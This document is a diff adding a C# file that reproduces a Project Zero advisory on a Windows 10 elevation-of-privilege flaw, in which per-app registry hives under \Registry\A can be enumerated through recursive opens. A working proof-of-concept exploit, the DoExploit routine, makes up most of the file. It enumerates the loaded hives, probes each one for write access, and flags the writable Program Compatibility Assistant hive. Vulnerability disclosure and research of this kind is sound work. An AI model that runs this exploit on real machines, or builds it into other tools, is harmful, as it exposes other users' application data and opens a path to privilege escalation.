@@ -1,0 +1,286 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=870
+
+Windows: RegLoadAppKey Hive Enumeration EoP
+Platform: Windows 10 10586 not tested 8.1 Update 2 or Windows 7
+Class: Elevation of Privilege
+
+Summary:
+RegLoadAppKey is documented to load keys in a location which can’t be enumerated and also non-guessable. However it’s possible to enumerate loaded hives and find ones which can be written to which might lead to EoP.
+
+Description:
+
+The RegLoadAppKey API loads a user specified hive without requiring administrator privileges. This is used to provide per-application registry hives and is used extensively by Immersive Applications but also some system services. The MSDN documentation states that the keys cannot be enumerated, the only way to get access to the same hive is by opening the file again using RegLoadAppKey which requires having suitable permissions on the target hive file. It also ensures that you can’t guess the loaded key name by generating a random GUID which is going to be pretty difficult to brute-force. 
+
+This in part seems to be true if you try and open directly the attachment point of ‘\Registry\A’. That fails with access denied (I’ve not looked into the kernel to work out what actually does this check). However there’s no protection from recursive enumeration, so we can open ‘\Registry’ for read access, then open ‘A’ relative to that key. With this we can now enumerate all the loaded per-app hives.
+
+What we can do with this is less clear cut as it depends on what is using application hives at the current point in time. Immersive applications use per-app hives for their activation data and settings. While the activation hive seems to be correctly locked to only the user, the settings are not. As the default DACL for the settings hive is granting Everyone and ALL_APPLICATION_PACKAGES full access this means an Immersive Application could read/write settings data from any other running application. This even works between users on the same machine, so for example on a Terminal Server one user could read the settings of another user’s running Immersive Applications. At the least this is an information disclosure issue, but it might Edge content processes to access the settings of the main Edge process (which runs under a different package SID).
+
+A few system services also use per-app hives, including the Background Tasks Infrastructure Service and Program Compatibility Assistant. The tasks hive is locked for write access to normal user’s although it can be read, while the PCA hive is fully writable by any user on the system (the hives file isn’t even readable by a normal user, let alone writable). I’ve not investigated if it’s possible to abuse this access to elevate privileges, but it certainly seems a possibility. There might be other vulnerable services which could be exploited, however I’ve not investigated much further on this.
+
+In the end it’s clear that there’s an assumption being made that as these hives shouldn’t be enumerable then that’s enough security to prevent abuse. This is especially true with the settings hives for immersive applications, the file DACL is locked to the package SID however the hive itself is allowed for all access to any package and relies on the fact that an application couldn’t open a new handle to it as the security boundary. 
+
+Proof of Concept:
+
+I’ve provided a PoC as a C# source code file. You need to compile it first.
+
+1) Compile the C# source code file.
+2) Execute the PoC executable as a normal user.
+3) The PoC should print that it’s found some registry hives which it shouldn’t be able to enumerate. 
+4) It should also say it’s found the PCA hive as well. 
+
+Expected Result:
+You can’t enumerate per-app registry hives.
+
+Observed Result:
+The hives can be enumerated and also some of them can be written to.
+*/
+
+using Microsoft.Win32;
+using Microsoft.Win32.SafeHandles;
+using System;
+using System.Runtime.InteropServices;
+
+namespace Poc_RegLoadAppKey_EoP
+{
+  class Program
+  {
+    [Flags]
+    enum AttributeFlags : uint
+    {
+      None = 0,
+      Inherit = 0x00000002,
+      Permanent = 0x00000010,
+      Exclusive = 0x00000020,
+      CaseInsensitive = 0x00000040,
+      OpenIf = 0x00000080,
+      OpenLink = 0x00000100,
+      KernelHandle = 0x00000200,
+      ForceAccessCheck = 0x00000400,
+      IgnoreImpersonatedDevicemap = 0x00000800,
+      DontReparse = 0x00001000,
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    sealed class UnicodeString
+    {
+      ushort Length;
+      ushort MaximumLength;
+      [MarshalAs(UnmanagedType.LPWStr)]
+      string Buffer;
+
+      public UnicodeString(string str)
+      {
+        Length = (ushort)(str.Length * 2);
+        MaximumLength = (ushort)((str.Length * 2) + 1);
+        Buffer = str;
+      }
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    sealed class ObjectAttributes : IDisposable
+    {
+      int Length;
+      IntPtr RootDirectory;
+      IntPtr ObjectName;
+      AttributeFlags Attributes;
+      IntPtr SecurityDescriptor;
+      IntPtr SecurityQualityOfService;
+
+      private static IntPtr AllocStruct(object s)
+      {
+        int size = Marshal.SizeOf(s);
+        IntPtr ret = Marshal.AllocHGlobal(size);
+        Marshal.StructureToPtr(s, ret, false);
+        return ret;
+      }
+
+      private static void FreeStruct(ref IntPtr p, Type struct_type)
+      {
+        Marshal.DestroyStructure(p, struct_type);
+        Marshal.FreeHGlobal(p);
+        p = IntPtr.Zero;
+      }
+
+      public ObjectAttributes(string object_name, AttributeFlags flags, IntPtr root)
+      {
+        Length = Marshal.SizeOf(this);
+        if (object_name != null)
+        {
+          ObjectName = AllocStruct(new UnicodeString(object_name));
+        }
+        Attributes = flags;
+        RootDirectory = root;
+      }
+
+      public void Dispose()
+      {
+        if (ObjectName != IntPtr.Zero)
+        {
+          FreeStruct(ref ObjectName, typeof(UnicodeString));
+        }
+        GC.SuppressFinalize(this);
+      }
+
+      ~ObjectAttributes()
+      {
+        Dispose();
+      }
+    }
+
+    [Flags]
+    enum GenericAccessRights : uint
+    {
+      None = 0,
+      GenericRead = 0x80000000,
+      GenericWrite = 0x40000000,
+      GenericExecute = 0x20000000,
+      GenericAll = 0x10000000,
+      Delete = 0x00010000,
+      ReadControl = 0x00020000,
+      WriteDac = 0x00040000,
+      WriteOwner = 0x00080000,
+      Synchronize = 0x00100000,
+      MaximumAllowed = 0x02000000,
+    }
+
+    class NtException : ExternalException
+    {
+      [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+      private static extern IntPtr GetModuleHandle(string modulename);
+
+      [Flags]
+      enum FormatFlags
+      {
+        AllocateBuffer = 0x00000100,
+        FromHModule = 0x00000800,
+        FromSystem = 0x00001000,
+        IgnoreInserts = 0x00000200
+      }
+
+      [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+      private static extern int FormatMessage(
+        FormatFlags dwFlags,
+        IntPtr lpSource,
+        int dwMessageId,
+        int dwLanguageId,
+        out IntPtr lpBuffer,
+        int nSize,
+        IntPtr Arguments
+      );
+
+      [DllImport("kernel32.dll")]
+      private static extern IntPtr LocalFree(IntPtr p);
+
+      private static string StatusToString(int status)
+      {
+        IntPtr buffer = IntPtr.Zero;
+        try
+        {
+          if (FormatMessage(FormatFlags.AllocateBuffer | FormatFlags.FromHModule | FormatFlags.FromSystem | FormatFlags.IgnoreInserts,
+              GetModuleHandle("ntdll.dll"), status, 0, out buffer, 0, IntPtr.Zero) > 0)
+          {
+            return Marshal.PtrToStringUni(buffer);
+          }
+        }
+        finally
+        {
+          if (buffer != IntPtr.Zero)
+          {
+            LocalFree(buffer);
+          }
+        }
+        return String.Format("Unknown Error: 0x{0:X08}", status);
+      }
+
+      public NtException(int status) : base(StatusToString(status))
+      {
+      }
+    }
+
+    static void StatusToNtException(int status)
+    {
+      if (status < 0)
+      {
+        throw new NtException(status);
+      }
+    }
+
+    [DllImport("ntdll.dll")]
+    static extern int NtOpenKeyEx(
+      out SafeRegistryHandle KeyHandle,
+      GenericAccessRights DesiredAccess,
+      [In] ObjectAttributes ObjectAttributes,
+      int OpenOptions
+    );
+
+    [DllImport("ntdll.dll")]
+    static extern int NtClose(IntPtr handle);
+
+    static RegistryKey OpenKey(RegistryKey base_key, string path, bool writable = false, bool throw_on_error = true)
+    {
+      IntPtr root_key = base_key != null ? base_key.Handle.DangerousGetHandle() : IntPtr.Zero;
+      using (ObjectAttributes KeyName = new ObjectAttributes(path, AttributeFlags.CaseInsensitive | AttributeFlags.OpenLink, root_key))
+      {
+        SafeRegistryHandle keyHandle;
+        GenericAccessRights desired_access = GenericAccessRights.GenericRead;
+        if (writable)
+        {
+          desired_access |= GenericAccessRights.GenericWrite;
+        }
+        
+        int status = NtOpenKeyEx(out keyHandle, desired_access, KeyName, 0);
+        if (throw_on_error)
+        {
+          StatusToNtException(status);
+        }
+
+        if (status == 0)
+          return RegistryKey.FromHandle(keyHandle);
+
+        return null;
+      }
+    }
+    
+    static void DoExploit()
+    {
+      RegistryKey root_key = OpenKey(null, @"\Registry");
+      RegistryKey attach_key = root_key.OpenSubKey("A");
+      
+      foreach (string key_name in attach_key.GetSubKeyNames())
+      {
+        bool writable = true;
+        RegistryKey app_key = OpenKey(attach_key, key_name, true, false);
+        if (app_key == null)
+        {
+          writable = false;
+          app_key = OpenKey(attach_key, key_name, false, false);
+        }
+
+        if (app_key != null)
+        {
+          Console.WriteLine(@"Found {0} Key \Registry\A\{1}", writable ? "Writable" : "Readable", key_name);
+          RegistryKey sub_key = app_key.OpenSubKey(@"Root\Programs");
+          if (sub_key != null)
+          {
+            Console.WriteLine("{0} is the PCA Cache Hive", key_name);
+            sub_key.Close();
+          }
+          app_key.Close();
+        }
+      }
+    }
+
+    static void Main(string[] args)
+    {
+      try
+      {       
+        DoExploit();       
+      }
+      catch (Exception ex)
+      {
+        Console.WriteLine(ex.Message);
+      }
+    }
+  }
+}
